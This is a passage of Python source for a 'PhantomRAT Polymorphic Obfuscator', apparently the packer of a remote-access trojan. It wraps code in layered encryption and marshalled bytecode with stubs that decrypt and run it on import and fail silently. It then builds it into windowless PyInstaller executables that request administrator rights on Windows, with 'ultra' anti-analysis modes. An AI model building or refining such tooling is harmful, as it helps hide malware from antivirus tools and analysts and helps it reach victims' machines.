                    "# System generated",
                    "# This code is protected"
                ]
                processed.append(random.choice(comments))
            
            processed.append(line)
        
        # Add header
        header = f"""
# Obfuscated by PhantomRAT Polymorphic Obfuscator v2.0
# Complexity level: {self.config.complexity}
# Timestamp: {datetime.now().isoformat()}
# Seed: {self.config.seed}
"""
        
        return header + '\n'.join(processed)

# ============= ADVANCED OBFUSCATOR =============
class AdvancedObfuscator:
    """Main obfuscator with multiple layers and packing options"""
    
    def __init__(self, config: Optional[ObfuscatorConfig] = None):
        self.config = config or ObfuscatorConfig()
        self.polymorphic = EnhancedPolymorphicObfuscator(self.config)
        
        # Performance metrics
        self.metrics = {
            'original_size': 0,
            'obfuscated_size': 0,
            'compression_ratio': 1.0,
            'obfuscation_time': 0.0,
            'transformation_count': 0
        }
    
    def obfuscate(self, code: str, method: str = 'multi') -> str:
        """
        Obfuscate code using specified method
        
        Methods:
        - simple: Basic renaming
        - polymorphic: Advanced polymorphic transformations
        - encrypted: Encryption-based obfuscation
        - packed: Bytecode packing
        - multi: Multi-layer obfuscation
        - ultra: Maximum obfuscation with anti-analysis
        """
        start_time = time.time()
        self.metrics['original_size'] = len(code)
        
        if method == 'simple':
            result = self._simple_obfuscate(code)
        elif method == 'polymorphic':
            result = self._polymorphic_obfuscate(code)
        elif method == 'encrypted':
            result = self._encrypted_obfuscate(code)
        elif method == 'packed':
            result = self._pack_obfuscate(code)
        elif method == 'multi':
            result = self._multi_layer_obfuscate(code)
        elif method == 'ultra':
            result = self._ultra_obfuscate(code)
        else:
            result = code
        
        self.metrics['obfuscated_size'] = len(result)
        self.metrics['compression_ratio'] = self.metrics['original_size'] / max(self.metrics['obfuscated_size'], 1)
        self.metrics['obfuscation_time'] = time.time() - start_time
        
        return result
    
    def _simple_obfuscate(self, code: str) -> str:
        """Simple obfuscation"""
        config = ObfuscatorConfig(complexity=2, enable_anti_analysis=False)
        obfuscator = EnhancedPolymorphicObfuscator(config)
        return obfuscator.obfuscate_code(code)
    
    def _polymorphic_obfuscate(self, code: str) -> str:
        """Polymorphic obfuscation"""
        return self.polymorphic.obfuscate_code(code)
    
    def _encrypted_obfuscate(self, code: str) -> str:
        """Encryption-based obfuscation"""
        # First, polymorphic obfuscation
        poly_code = self.polymorphic.obfuscate_code(code)
        
        # Compress
        if self.config.use_lzma:
            compressed = lzma.compress(poly_code.encode(), preset=self.config.compression_level)
        else:
            compressed = zlib.compress(poly_code.encode(), level=self.config.compression_level)
        
        # Encrypt
        encryption = EncryptionManager(self.config)
        if self.config.use_aesgcm:
            # AES-GCM encryption
            nonce = secrets.token_bytes(12)
            aesgcm = encryption.aesgcm
            encrypted = nonce + aesgcm.encrypt(nonce, compressed, None)
        else:
            # Fernet encryption
            encrypted = encryption.fernet.encrypt(compressed)
        
        encoded = base64.b64encode(encrypted).decode()
        
        # Create decryptor
        decryptor = f"""
import base64, lzma, zlib, sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Encrypted payload
ENCRYPTED = "{encoded}"
KEY = base64.b64decode("{base64.b64encode(self.config.encryption_key).decode()}")

def __decrypt_and_execute__():
    try:
        data = base64.b64decode(ENCRYPTED)
        
        {"# AES-GCM decryption" if self.config.use_aesgcm else "# Fernet decryption"}
        {"decrypted = AESGCM(KEY[:32]).decrypt(data[:12], data[12:], None)" if self.config.use_aesgcm else 
         "decrypted = Fernet(KEY).decrypt(data)"}
        
        # Decompress
        {"decompressed = lzma.decompress(decrypted)" if self.config.use_lzma else 
         "decompressed = zlib.decompress(decrypted)"}
        
        # Execute
        exec(decompressed.decode(), globals())
    except Exception as e:
        # Silent error handling
        pass

# Auto-execute
if __name__ != "__main__":
    __decrypt_and_execute__()
"""
        
        return decryptor
    
    def _pack_obfuscate(self, code: str) -> str:
        """Bytecode packing"""
        # Obfuscate first
        obfuscated = self.polymorphic.obfuscate_code(code)
        
        # Compile to bytecode
        compiled = compile(obfuscated, '<obfuscated>', 'exec')
        
        # Marshal bytecode
        marshaled = marshal.dumps(compiled)
        
        # Optional: compress marshaled bytecode
        if self.config.use_lzma:
            packed = lzma.compress(marshaled, preset=self.config.compression_level)
        else:
            packed = zlib.compress(marshaled, level=self.config.compression_level)
        
        # Encode
        encoded = base64.b64encode(packed).decode()
        
        # Create unpacker
        unpacker = f"""
import marshal, base64, lzma, zlib, types, sys

# Packed bytecode
PACKED = "{encoded}"

def __unpack_and_execute__():
    try:
        # Decode and decompress
        packed = base64.b64decode(PACKED)
        {"data = lzma.decompress(packed)" if self.config.use_lzma else "data = zlib.decompress(packed)"}
        
        # Unmarshal and execute
        code_obj = marshal.loads(data)
        exec(code_obj, globals())
    except Exception as e:
        # Silent error
        pass

# Execute
__unpack_and_execute__()
"""
        
        return unpacker
    
    def _multi_layer_obfuscate(self, code: str) -> str:
        """Multi-layer obfuscation"""
        # Layer 1: Polymorphic obfuscation
        layer1 = self._polymorphic_obfuscate(code)
        
        # Layer 2: Encryption
        layer2 = self._encrypted_obfuscate(layer1)
        
        # Layer 3: Add integrity check
        layer3 = self._add_integrity_check(layer2)
        
        return layer3
    
    def _ultra_obfuscate(self, code: str) -> str:
        """Maximum obfuscation with all features"""
        # Use maximum complexity
        ultra_config = ObfuscatorConfig(
            complexity=5,
            enable_anti_analysis=True,
            enable_polymorphic=True,
            enable_metadata_stripping=True,
            string_encryption=True,
            use_aesgcm=True,
            use_lzma=True,
            compression_level=9
        )
        
        ultra_obfuscator = AdvancedObfuscator(ultra_config)
        
        # Apply multiple passes
        result = code
        for i in range(3):  # 3 passes for ultra obfuscation
            result = ultra_obfuscator.obfuscate(result, 'multi')
        
        return result
    
    def _add_integrity_check(self, code: str) -> str:
        """Add integrity checking"""
        if not self.config.enable_integrity_check:
            return code
        
        # Calculate checksum
        checksum = hashlib.sha256(code.encode()).hexdigest()
        
        integrity_code = f"""
import hashlib, sys

# Integrity check
CODE_CHECKSUM = "{checksum}"

def __verify_integrity__(code):
    calculated = hashlib.sha256(code.encode()).hexdigest()
    return calculated == CODE_CHECKSUM

if not __verify_integrity__(__file__ if hasattr(__file__, 'read') else ""):
    # Integrity check failed - exit silently
    sys.exit(0)
"""
        
        return integrity_code + '\n' + code
    
    def get_metrics(self) -> Dict[str, Any]:
        """Get obfuscation metrics"""
        return self.metrics

# ============= FILE OPERATIONS =============
def obfuscate_file(
    input_file: str,
    output_file: Optional[str] = None,
    method: str = 'multi',
    config: Optional[ObfuscatorConfig] = None
) -> Optional[str]:
    """Obfuscate a Python file"""
    try:
        # Read input file
        with open(input_file, 'r', encoding='utf-8') as f:
            code = f.read()
        
        # Create obfuscator
        obfuscator = AdvancedObfuscator(config)
        
        # Obfuscate code
        obfuscated = obfuscator.obfuscate(code, method)
        
        # Determine output filename
        if output_file is None:
            base, ext = os.path.splitext(input_file)
            output_file = f"{base}_obfuscated{ext}"
        
        # Write output
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        
        # Print metrics
        metrics = obfuscator.get_metrics()
        print(f"Obfuscated: {input_file} -> {output_file}")
        print(f"Method: {method}")
        print(f"Original size: {metrics['original_size']} bytes")
        print(f"Obfuscated size: {metrics['obfuscated_size']} bytes")
        print(f"Compression ratio: {metrics['compression_ratio']:.2f}")
        print(f"Time: {metrics['obfuscation_time']:.3f}s")
        
        return output_file
        
    except Exception as e:
        print(f"Error obfuscating file: {e}")
        return None

def batch_obfuscate(
    input_dir: str,
    output_dir: Optional[str] = None,
    method: str = 'multi',
    config: Optional[ObfuscatorConfig] = None,
    pattern: str = '*.py'
) -> List[str]:
    """Obfuscate multiple files"""
    import glob
    
    if output_dir is None:
        output_dir = os.path.join(input_dir, 'obfuscated')
    
    os.makedirs(output_dir, exist_ok=True)
    
    files = glob.glob(os.path.join(input_dir, pattern))
    results = []
    
    for file in files:
        rel_path = os.path.relpath(file, input_dir)
        output_file = os.path.join(output_dir, rel_path)
        
        result = obfuscate_file(file, output_file, method, config)
        if result:
            results.append(result)
    
    print(f"Batch obfuscation complete: {len(results)} files processed")
    return results

# ============= EXE CREATION =============
def create_standalone_exe(
    code: str,
    output_file: str = 'obfuscated.exe',
    obfuscate: bool = True,
    method: str = 'multi',
    config: Optional[ObfuscatorConfig] = None
) -> Optional[str]:
    """Create standalone executable with PyInstaller"""
    try:
        # Check if PyInstaller is available
        import subprocess
        import tempfile
        import shutil
        
        # Obfuscate code if requested
        if obfuscate:
            obfuscator = AdvancedObfuscator(config)
            code = obfuscator.obfuscate(code, method)
        
        # Create temporary directory
        tmp_dir = tempfile.mkdtemp(prefix='phantom_obfuscate_')
        tmp_file = os.path.join(tmp_dir, 'obfuscated.py')
        
        # Write code to temporary file
        with open(tmp_file, 'w', encoding='utf-8') as f:
            f.write(code)
        
        # Build PyInstaller command
        exe_name = os.path.splitext(os.path.basename(output_file))[0]
        
        cmd = [
            sys.executable, '-m', 'pyinstaller',
            '--onefile',
            '--noconsole',
            '--name', exe_name,
            '--distpath', os.path.dirname(os.path.abspath(output_file)),
            '--workpath', os.path.join(tmp_dir, 'build'),
            '--specpath', tmp_dir,
            tmp_file
        ]
        
        # Add platform-specific options
        if sys.platform == 'win32':
            cmd.extend(['--uac-admin'])  # Request admin on Windows
        
        # Run PyInstaller
        print(f"Creating executable with PyInstaller...")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"Created standalone executable: {output_file}")
            
            # Cleanup
            shutil.rmtree(tmp_dir, ignore_errors=True)
            
            return output_file
        else:
            print(f"PyInstaller error: {result.stderr}")
            return None
            
    except ImportError:
        print("PyInstaller not installed. Install with: pip install pyinstaller")
        return None
    except Exception as e:
        print(f"Error creating executable: {e}")
        return None

# ============= TESTING =============
def test_obfuscator():
    """Test the obfuscator"""
    print("Testing PhantomRAT Polymorphic Obfuscator v2.0")
    print("=" * 60)
    
    # Test code
    test_code = '''
def calculate_sum(numbers):
    """Calculate sum of numbers"""
    total = 0
    for num in numbers:
        total += num
    return total

def process_data(data, key="secret"):
    """Process sensitive data"""
    import hashlib
    hashed = hashlib.sha256(key.encode()).hexdigest()
    result = {}
    
    for k, v in data.items():
        if isinstance(v, str):
            result[k] = v.upper() + "_" + hashed[:8]
        else:
            result[k] = v * 2
    
    return result

class DataProcessor:
    """Process and analyze data"""
    
    def __init__(self, config=None):
        self.config = config or {}
        self.cache = {}
    
    def analyze(self, dataset):
        """Analyze dataset"""
        stats = {
            'count': len(dataset),
            'sum': sum(dataset),
            'avg': sum(dataset) / len(dataset) if dataset else 0
        }
        
        if self.config.get('encrypt', False):
            import base64
            stats['encrypted'] = base64.b64encode(str(stats).encode()).decode()
        
        return stats

if __name__ == "__main__":
    # Test functions
    numbers = [1, 2, 3, 4, 5]
    print(f"Sum: {calculate_sum(numbers)}")
    
    data = {"name": "test", "value": 42}
    print(f"Processed: {process_data(data)}")
    
    processor = DataProcessor({'encrypt': True})
    print(f"Analysis: {processor.analyze(numbers)}")
'''
    
    # Test different methods
    methods = ['simple', 'polymorphic', 'encrypted', 'packed', 'multi', 'ultra']
    
    for method in methods:
        print(f"\n{'='*30}")
        print(f"Method: {method}")
        print('='*30)
        
        config = ObfuscatorConfig(complexity=5 if method == 'ultra' else 3)
        obfuscator = AdvancedObfuscator(config)
        
        start = time.time()
        result = obfuscator.obfuscate(test_code, method)
        elapsed = time.time() - start
        
        metrics = obfuscator.get_metrics()
        
        print(f"Time: {elapsed:.3f}s")
        print(f"Original: {metrics['original_size']} bytes")
        print(f"Obfuscated: {metrics['obfuscated_size']} bytes")
        print(f"Ratio: {metrics['compression_ratio']:.2f}")
        print(f"Preview (first 200 chars):")
        print(result[:200] + "...")
    
    print(f"\n{'='*60}")
    print("Test complete!")

# ============= MAIN =============
if __name__ == "__main__":
    # Parse command line arguments
    import argparse
    
    parser = argparse.ArgumentParser(description='PhantomRAT Polymorphic Obfuscator v2.0')
    parser.add_argument('input', nargs='?', help='Input file or directory')
    parser.add_argument('-o', '--output', help='Output file or directory')
    parser.add_argument('-m', '--method', default='multi', 
                       choices=['simple', 'polymorphic', 'encrypted', 'packed', 'multi', 'ultra'],
                       help='Obfuscation method')
    parser.add_argument('-c', '--complexity', type=int, default=5, choices=range(1, 6),
                       help='Obfuscation complexity (1-5)')
    parser.add_argument('-b', '--batch', action='store_true', help='Batch process directory')
    parser.add_argument('-x', '--exe', action='store_true', help='Create executable')
    parser.add_argument('-t', '--test', action='store_true', help='Run tests')
    parser.add_argument('--no-anti-analysis', action='store_true', help='Disable anti-analysis')
    parser.add_argument('--no-string-encryption', action='store_true', help='Disable string encryption')
    parser.add_argument('--seed', type=int, help='Random seed for reproducibility')
    
    args = parser.parse_args()
    
    if args.test:
        test_obfuscator()
        sys.exit(0)
    
    if not args.input:
        print("Error: Input file or directory required")
        parser.print_help()
        sys.exit(1)
    
    # Create configuration
    config = ObfuscatorConfig(
        complexity=args.complexity,
        enable_anti_analysis=not args.no_anti_analysis,
        string_encryption=not args.no_string_encryption,
        seed=args.seed
    )
    
    if args.batch:
        # Batch process directory
        if not os.path.isdir(args.input):
            print("Error: Input must be a directory for batch processing")
            sys.exit(1)
        
        results = batch_obfuscate(
            input_dir=args.input,
            output_dir=args.output,
            method=args.method,
            config=config
        )
        
        print(f"Batch processing complete: {len(results)} files obfuscated")
    
    elif args.exe:
        # Create executable
        if not os.path.isfile(args.input):
            print("Error: Input must be a file for executable creation")
            sys.exit(1)
        
        with open(args.input, 'r', encoding='utf-8') as f:
            code = f.read()
        
        output_exe = args.output or 'obfuscated.exe'
        result = create_standalone_exe(
            code=code,
            output_file=output_exe,
            obfuscate=True,
            method=args.method,
            config=config
        )
        
        if result:
            print(f"Executable created: {result}")
    
    else:
        # Single file obfuscation
        if not os.path.isfile(args.input):
            print("Error: Input must be a file")
            sys.exit(1)
        
        result = obfuscate_file(
            input_file=args.input,
            output_file=args.output,
            method=args.method,
            config=config
        )
        
        if result:
            print(f"File obfuscated: {result}")
